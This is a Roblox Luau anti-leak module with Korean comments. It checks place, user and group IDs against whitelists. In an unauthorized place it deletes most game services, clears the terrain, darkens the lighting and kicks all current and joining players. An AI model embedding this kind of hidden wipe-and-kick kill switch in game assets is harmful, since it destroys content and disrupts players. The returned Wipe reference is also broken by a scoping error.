-- [[ sys1-0 : 삼중 검증 및 확장 제어 엔진 ]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- 1. 삼중 마스터 화이트리스트 데이터베이스
local ALLOWED_PLACES = {
	[123456789] = true, -- 허가된 Place ID
}

local ALLOWED_USERS = {
	[11223344] = true,  -- 허가된 User ID
}

local ALLOWED_GROUPS = {
	[99887766] = true,  -- 허가된 Group ID
}

-- 2. 현재 환경 정보 수집
local currentPlaceId = game.PlaceId
local currentCreatorId = game.CreatorId
local currentCreatorType = game.CreatorType

--------------------------------------------------
game.ReplicatedStorage.data.Value = true
--------------------------------------------------


-- 3. 교차 검증 검사
local isAuthorized = false

if ALLOWED_PLACES[currentPlaceId] then
	isAuthorized = true
	--------------------------------------------------
	game.ReplicatedStorage.pi.Value = true
	--------------------------------------------------
end

if currentCreatorType == Enum.CreatorType.User and ALLOWED_USERS[currentCreatorId] then
	isAuthorized = true
	--------------------------------------------------
	game.ReplicatedStorage.ui.Value = true
	--------------------------------------------------
end

if currentCreatorType == Enum.CreatorType.Group and ALLOWED_GROUPS[currentCreatorId] then
	isAuthorized = true
	--------------------------------------------------
	game.ReplicatedStorage.gi.Value = true
	--------------------------------------------------
end


-- 4. 조건별 실행 분기
if isAuthorized then
	-- ==========================================
	-- [인증 완료] 정상 작동 구간
	-- ==========================================

	--------------------------------------------------
	game.ReplicatedStorage.good.Value = true
	--------------------------------------------------

	--------------------------------------------------
	-- 님의 핵심 작동 코드를 여기에 배치
	--------------------------------------------------

else
	-- ==========================================
	-- [인증 실패] 비인가 환경 제어 구간
	-- ==========================================

	--------------------------------------------------
	game.ReplicatedStorage.ihateu.Value = true
	--------------------------------------------------

	local function CompleteWipe()
		-- 1. 데이터 영역 순회 파괴
		local locations = {
			game.Workspace,
			game.ReplicatedStorage,
			game.ServerStorage,
			game.StarterGui,
			game.StarterPack,
			game.Teams,
			game.ServerScriptService
		}

		for _, location in ipairs(locations) do
			pcall(function()
				for _, item in ipairs(location:GetChildren()) do
					-- 시스템 필수 객체 및 유저 제외 후 삭제
					if not item:IsA("Player") and not item:IsA("Camera") and not item:IsA("Terrain") then
						item:Destroy()
					end
				end
			end)
		end

		-- 2. 지형 초기화
		pcall(function()
			game.Workspace.Terrain:Clear()
		end)

		-- 3. 환경 조명 암전 및 시각 요소 제거
		pcall(function()
			game.Lighting.Brightness = 0
			game.Lighting.ClockTime = 0
			game.Lighting.GlobalShadows = true
			game.Lighting:ClearAllChildren()
			game.Lighting.FogEnd = 0
			game.Lighting.Ambient = Color3.new(0, 0, 0)
		end)

		-- 4. 유저 강퇴 처리
		local kickMessage = "계약 위반 및 에셋 유출로 인해 이 서버는 무력화되었습니다. (ㅅㄱ)"
		for _, player in pairs(Players:GetPlayers()) do
			pcall(function() player:Kick(kickMessage) end)
		end
		Players.PlayerAdded:Connect(function(player)
			player:Kick(kickMessage)
		end)
	end

	-- 즉시 실행
	task.spawn(CompleteWipe)
end

-- ==========================================
-- 스튜디오 메인 스크립트와 데이터 흐름 맞추기용 리턴
-- ==========================================
local SystemResult = {
	["Status"] = isAuthorized,
	["Wipe"] = CompleteWipe
}

return SystemResult
